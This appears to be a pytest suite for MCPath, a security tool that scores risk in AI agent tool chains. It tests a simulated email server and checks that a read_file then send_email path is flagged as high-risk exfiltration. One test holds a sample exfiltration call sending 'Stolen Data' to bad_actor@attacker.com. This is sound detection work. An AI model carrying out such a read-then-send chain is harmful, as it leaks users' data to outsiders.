"""Tests for the Safe Mock Email External-Action MCP Server and Capability Modeling.

Validates:
1. Mock server starts and connects via MCP stdio transport.
2. 'send_email' is discovered by MCPath and exposed via DownstreamClientManager.
3. Capability metadata is inferred deterministically without hardcoding.
4. Isolated email action is represented correctly in the causal graph.
5. Sensitive Data -> send_email -> External Destination path is formed and recognized.
6. Existing critical-path override triggers and produces HIGH classification (>= 85.0).
7. Zero real email or external network requests occur (safe simulation only).
"""

import asyncio
from pathlib import Path
import socket
import sys
from unittest.mock import patch
import pytest
import pytest_asyncio
from mcp.client.stdio import stdio_client, StdioServerParameters
from mcp.client.session import ClientSession

from mcpath.config.settings import ServerConfig, ServerDefinition, settings
from mcpath.graph.capability_inference import CapabilityClassifier, ToolCapability
from mcpath.graph.capability_graph import CapabilityGraph, PathScoringResult
from mcpath.pipeline.stage import PipelineContext
from mcpath.pipeline.stages.stage2_capability import Stage2CapabilityRisk
from mcpath.proxy.client_manager import DownstreamClientManager
from mcpath.risk_engine.models import SecurityEventRecord
from mock_servers.email_server import send_email as send_email_func


EMAIL_SERVER_PATH = str(Path(__file__).parent.parent / "mock_servers" / "email_server.py")


# ---------------------------------------------------------------------------
# Test 1: Mock server starts and connects via official MCP stdio transport
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_mock_email_server_starts_and_connects():
    """Verify that mock email server launches as an official MCP stdio server."""
    params = StdioServerParameters(command=sys.executable, args=[EMAIL_SERVER_PATH])
    async with stdio_client(params) as (read, write):
        async with ClientSession(read, write) as session:
            init_res = await asyncio.wait_for(session.initialize(), timeout=5.0)
            assert init_res.server_info.name == "mcpath-mock-email-server"

            tools_res = await session.list_tools()
            tool_names = [t.name for t in tools_res.tools]
            assert "send_email" in tool_names

            # Verify schema
            send_tool = next(t for t in tools_res.tools if t.name == "send_email")
            schema = getattr(send_tool, "input_schema", None) or getattr(send_tool, "inputSchema", {})
            props = schema.get("properties", {}) if isinstance(schema, dict) else getattr(schema, "properties", {})
            assert "recipient" in props
            assert "subject" in props
            assert "body" in props


# ---------------------------------------------------------------------------
# Test 2: Safe execution simulation (no real network or email dispatch)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_mock_email_server_safe_simulation_no_network():
    """Verify that calling send_email strictly simulates and makes zero network socket/email calls."""
    # Direct function execution safety check with network modules mocked
    with patch("smtplib.SMTP") as mock_smtp, \
         patch("smtplib.SMTP_SSL") as mock_smtp_ssl, \
         patch("urllib.request.urlopen") as mock_urlopen, \
         patch("http.client.HTTPConnection") as mock_http:
        result = send_email_func(
            recipient="test@example.com",
            subject="Test Alert",
            body="Simulated confidential body"
        )
        assert "[MOCK EMAIL QUEUED]" in result
        assert "To: test@example.com" in result
        assert "SIMULATED (no external network request made)" in result

        mock_smtp.assert_not_called()
        mock_smtp_ssl.assert_not_called()
        mock_urlopen.assert_not_called()
        mock_http.assert_not_called()

    # Via MCP ClientSession execution check
    params = StdioServerParameters(command=sys.executable, args=[EMAIL_SERVER_PATH])
    async with stdio_client(params) as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()
            with patch("smtplib.SMTP") as mock_smtp, \
                 patch("urllib.request.urlopen") as mock_urlopen:
                call_res = await session.call_tool(
                    "send_email",
                    {"recipient": "auditor@domain.org", "subject": "Audit Log", "body": "Summary text"}
                )
                assert len(call_res.content) > 0
                assert "[MOCK EMAIL QUEUED]" in call_res.content[0].text
                assert "auditor@domain.org" in call_res.content[0].text
                mock_smtp.assert_not_called()
                mock_urlopen.assert_not_called()


# ---------------------------------------------------------------------------
# Test 3: MCPath server_config discovery
# ---------------------------------------------------------------------------

def test_mcpath_discovers_email_server_via_config():
    """Verify that email-server is declared in server_config.json and discoverable."""
    server_cfg = settings.get_server_config()
    assert "email-server" in server_cfg.servers
    assert "email-server" in server_cfg.active_servers

    email_def = server_cfg.servers["email-server"]
    assert "email_server.py" in email_def.args[0]


# ---------------------------------------------------------------------------
# Test 4: Capability metadata inference (no hardcoded server logic)
# ---------------------------------------------------------------------------

def test_send_email_capability_inference():
    """Verify that capability inference deterministically classifies send_email."""
    classifier = CapabilityClassifier()
    tool_def = {
        "name": "send_email",
        "description": "Simulates sending an email to an external recipient safely without making any real network requests.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "recipient": {"type": "string"},
                "subject": {"type": "string"},
                "body": {"type": "string"}
            },
            "required": ["recipient", "subject", "body"]
        }
    }
    cap: ToolCapability = classifier.classify_tool("email-server", tool_def)

    assert cap.tool_name == "send_email"
    assert cap.server_name == "email-server"
    assert cap.operation == "WRITE"
    assert cap.action_type == "external_communication"
    assert cap.data_target == "email_outbox"
    assert cap.action_sensitivity == 3.0
    assert cap.external_exposure == 3.0
    assert cap.external_destination == "external_recipient"
    # Verify consumed data types allow sensitive flows
    assert "filesystem_data" in cap.consumed_data_types
    assert "database_records" in cap.consumed_data_types


# ---------------------------------------------------------------------------
# Test 5: Graph representation of isolated email action
# ---------------------------------------------------------------------------

def test_isolated_email_graph_representation():
    """Verify graph representation for an isolated email server."""
    graph = CapabilityGraph()
    tools = {
        "email-server": [
            {
                "name": "send_email",
                "description": "Simulates sending an email safely.",
                "inputSchema": {
                    "type": "object",
                    "properties": {"recipient": {"type": "string"}, "subject": {"type": "string"}, "body": {"type": "string"}}
                }
            }
        ]
    }
    graph.rebuild_for_all_servers(tools)

    # Required nodes present
    assert graph.graph.has_node("Agent")
    assert graph.graph.has_node("Tool:send_email")
    assert graph.graph.has_node("Resource:email_outbox")
    assert graph.graph.has_node("Action:send_email:external_communication")
    assert graph.graph.has_node("Destination:external_recipient")

    # Required typed edges present
    assert graph.graph.has_edge("Agent", "Tool:send_email")
    assert graph.graph["Agent"]["Tool:send_email"]["relation"] == "CAN_CALL"
    assert graph.graph.has_edge("Tool:send_email", "Resource:email_outbox")
    assert graph.graph["Tool:send_email"]["Resource:email_outbox"]["relation"] == "WRITES"
    assert graph.graph.has_edge("Resource:email_outbox", "Action:send_email:external_communication")
    assert graph.graph["Resource:email_outbox"]["Action:send_email:external_communication"]["relation"] == "FLOWS_TO"
    assert graph.graph.has_edge("Action:send_email:external_communication", "Destination:external_recipient")
    assert graph.graph["Action:send_email:external_communication"]["Destination:external_recipient"]["relation"] == "SENDS_TO"

    paths = graph.get_paths_for_tool("send_email")
    assert len(paths) == 1
    isolated_path = paths[0]
    assert isolated_path.path_nodes == [
        "Agent",
        "Tool:send_email",
        "Resource:email_outbox",
        "Action:send_email:external_communication",
        "Destination:external_recipient"
    ]
    # In isolated benign email, data_sensitivity is 1.0 (< 2.0 threshold for critical override)
    assert not isolated_path.is_critical_override


# ---------------------------------------------------------------------------
# Test 6: Sensitive Data -> send_email -> External Destination Path & Override
# ---------------------------------------------------------------------------

def test_sensitive_data_to_send_email_critical_override():
    """Verify that Sensitive Data -> send_email -> External Destination triggers Critical Path Override (HIGH)."""
    graph = CapabilityGraph()
    server_tools = {
        "filesystem": [
            {
                "name": "read_file",
                "description": "Read file from filesystem.",
                "inputSchema": {"type": "object", "properties": {"path": {"type": "string"}}}
            }
        ],
        "email-server": [
            {
                "name": "send_email",
                "description": "Simulates sending an email safely.",
                "inputSchema": {
                    "type": "object",
                    "properties": {"recipient": {"type": "string"}, "subject": {"type": "string"}, "body": {"type": "string"}}
                }
            }
        ]
    }
    graph.rebuild_for_all_servers(server_tools)

    # Compatible inter-tool edge formed: Resource:filesystem_data -> Action:send_email:external_communication
    assert graph.graph.has_edge("Resource:filesystem_data", "Action:send_email:external_communication")
    assert graph.graph["Resource:filesystem_data"]["Action:send_email:external_communication"]["relation"] == "FLOWS_TO"

    # Verify candidate paths for read_file include the exfiltration path
    read_paths = graph.get_paths_for_tool("read_file")
    exfil_paths = [
        p for p in read_paths
        if "Action:send_email:external_communication" in p.path_nodes
        and "Destination:external_recipient" in p.path_nodes
    ]
    assert len(exfil_paths) == 1
    p = exfil_paths[0]

    assert p.path_nodes == [
        "Agent",
        "Tool:read_file",
        "Resource:filesystem_data",
        "Action:send_email:external_communication",
        "Destination:external_recipient"
    ]
    assert p.data_sensitivity >= 2.0
    assert p.action_sensitivity == 3.0
    assert p.external_exposure == 3.0
    # Must trigger critical path override and be classified HIGH
    assert p.is_critical_override is True
    assert p.classification == "HIGH"
    assert p.path_risk_score >= 85.0
    assert "CRITICAL PATH OVERRIDE" in p.explanation


# ---------------------------------------------------------------------------
# Test 7: Runtime sequence mapping in Stage 2 pipeline
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_stage2_runtime_sequence_mapping_with_send_email():
    """Verify that Stage 2 evaluates the composite chain when send_email follows read_file."""
    graph = CapabilityGraph()
    server_tools = {
        "filesystem": [
            {
                "name": "read_file",
                "description": "Read file from filesystem.",
                "inputSchema": {"type": "object", "properties": {"path": {"type": "string"}}}
            }
        ],
        "email-server": [
            {
                "name": "send_email",
                "description": "Simulates sending an email safely.",
                "inputSchema": {
                    "type": "object",
                    "properties": {"recipient": {"type": "string"}, "subject": {"type": "string"}, "body": {"type": "string"}}
                }
            }
        ]
    }
    graph.rebuild_for_all_servers(server_tools)
    stage2 = Stage2CapabilityRisk(graph=graph)

    # Scenario: Agent calls read_file first, then calls send_email
    context = PipelineContext(
        server_name="email-server",
        tool_name="send_email",
        arguments={"recipient": "bad_actor@attacker.com", "subject": "Stolen Data", "body": "Sensitive contents"},
        call_history=["read_file", "send_email"],
        event_record=SecurityEventRecord(timestamp="2026-09-24T10:00:00Z", tool_name="send_email", server_name="email-server")
    )

    stage_result = await stage2.process_request(context)

    # Because call_history contains read_file -> send_email, sequence mapping matches the composite path
    assert stage_result.metadata["is_critical_override"] is True
    assert stage_result.score >= 85.0
    assert stage_result.passed is False  # HIGH risk fails Stage 2
    assert "CRITICAL PATH OVERRIDE" in stage_result.explanation
